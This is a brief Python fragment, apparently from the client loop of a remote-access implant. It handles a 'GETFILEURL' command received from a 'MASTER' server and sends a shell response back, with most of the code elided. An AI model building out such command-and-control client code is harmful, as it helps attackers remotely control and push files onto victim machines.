...
while True:
    ...
    elif response['type']=='GETFILEURL':
        full_file_path = response['command']
        print("[+] Sending GETFILEURL Response back to MASTER..")
        send_shell_response_to_server("File download success")
